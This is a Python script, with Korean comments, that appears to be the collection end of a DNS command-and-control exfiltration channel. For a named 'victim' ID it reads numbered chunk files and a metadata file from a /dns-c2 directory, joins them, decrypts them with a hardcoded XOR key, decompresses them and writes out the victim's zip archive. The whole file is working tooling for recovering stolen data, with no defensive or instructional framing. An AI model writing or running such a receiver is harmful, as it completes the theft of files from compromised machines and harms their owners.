import os
import zlib
import logging

# 로깅 설정
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")

def xor_decrypt(data, key="secret"):
    key_bytes = key.encode()
    return bytes(a ^ b for a, b in zip(data, key_bytes * (len(data) // len(key_bytes) + 1)))

def rebuild_zip(victim, chunks_dir, output_dir):
    victim_dir = os.path.join(chunks_dir, victim)
    if not os.path.exists(victim_dir):
        logging.error(f"Victim directory {victim_dir} not found")
        return False
    
    # 메타데이터 읽기
    meta_path = os.path.join(victim_dir, "meta.bin")
    if not os.path.exists(meta_path):
        logging.error(f"Meta file {meta_path} not found")
        return False
    with open(meta_path, "rb") as f:
        meta_data = f.read()
    if not meta_data.startswith(b"total:"):
        logging.error(f"Invalid meta data for {victim}: {meta_data}")
        return False
    total = int(meta_data.split(b":")[1])
    logging.info(f"Meta for {victim}: total={total}")
    
    # 청크 읽기
    chunks = {}
    for i in range(total):
        chunk_path = os.path.join(victim_dir, f"chunk{i}.bin")
        if not os.path.exists(chunk_path):
            logging.error(f"Chunk {i} missing for {victim}")
            return False
        with open(chunk_path, "rb") as f:
            chunks[i] = f.read()
        logging.info(f"Read chunk {i} for {victim}, length={len(chunks[i])}")
    
    # 데이터 합체
    data = b""
    for i in range(total):
        data += chunks[i]
    logging.info(f"Combined data for {victim}, length={len(data)}")
    
    # XOR 복호화
    decrypted = xor_decrypt(data)
    logging.info(f"XOR decrypted for {victim}, length={len(decrypted)}")
    
    # zlib 압축 해제
    try:
        decompressed = zlib.decompress(decrypted)
        logging.info(f"Decompressed for {victim}, length={len(decompressed)}")
    except zlib.error as e:
        logging.error(f"Decompression failed for {victim}: {e}")
        return False
    
    # 출력
    os.makedirs(output_dir, exist_ok=True)
    output_path = os.path.join(output_dir, f"{victim}.zip")
    with open(output_path, "wb") as f:
        f.write(decompressed)
    logging.info(f"Saved {output_path}")
    return True

if __name__ == "__main__":
    victim = "e50384dc"
    chunks_dir = "/dns-c2/chunks"
    output_dir = "/dns-c2/output"
    
    rebuild_zip(victim, chunks_dir, output_dir)
